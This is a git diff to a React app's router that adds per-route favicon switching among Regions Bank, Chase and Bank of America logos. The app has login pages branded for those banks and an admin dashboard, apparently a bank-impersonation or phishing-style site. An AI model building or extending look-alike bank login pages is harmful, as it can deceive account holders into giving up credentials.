@@ -1,4 +1,4 @@
-import { BrowserRouter, Routes, Route, Navigate } from 'react-router-dom'
+import { BrowserRouter, Routes, Route, Navigate, useLocation } from 'react-router-dom'
 import { useState, useEffect } from 'react'
 
 // Regions Bank
@@ -17,10 +17,40 @@ import BankOfAmericaLanding from './pages/BankOfAmericaLanding'
 import AdminLogin from './pages/AdminLogin'
 import AdminDashboard from './pages/AdminDashboard'
 
-function App() {
+function AppContent() {
+  const location = useLocation()
   const [isAuthenticated, setIsAuthenticated] = useState(false)
   const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false)
   const [loading, setLoading] = useState(true)
+
+  // Update favicon based on current route
+  useEffect(() => {
+    const updateFavicon = () => {
+      let faviconPath = '/regions-logo.svg' // default
+      const path = location.pathname
+
+      if (path.includes('/chase-bank')) {
+        faviconPath = '/chase-logo.svg'
+      } else if (path.includes('/bank-of-america')) {
+        faviconPath = '/bofa-logo.svg'
+      } else if (path.includes('/admin')) {
+        faviconPath = '/regions-logo.svg' // or use a generic admin icon
+      } else if (path.includes('/region-bank') || path === '/') {
+        faviconPath = '/regions-logo.svg'
+      }
+
+      // Update favicon
+      let link = document.querySelector("link[rel~='icon']")
+      if (!link) {
+        link = document.createElement('link')
+        link.rel = 'icon'
+        document.getElementsByTagName('head')[0].appendChild(link)
+      }
+      link.href = faviconPath
+    }
+
+    updateFavicon()
+  }, [location.pathname])
 
   useEffect(() => {
     // Handle GitHub Pages 404.html redirect
@@ -63,8 +93,7 @@ function App() {
   }
 
   return (
-    <BrowserRouter>
-      <Routes>
+    <Routes>
         {/* Regions Bank Routes */}
         <Route 
           path="/region-bank/login" 
@@ -124,6 +153,13 @@ function App() {
         {/* Default redirect */}
         <Route path="/" element={<Navigate to="/region-bank/login" replace />} />
       </Routes>
+  )
+}
+
+function App() {
+  return (
+    <BrowserRouter>
+      <AppContent />
     </BrowserRouter>
   )
 }
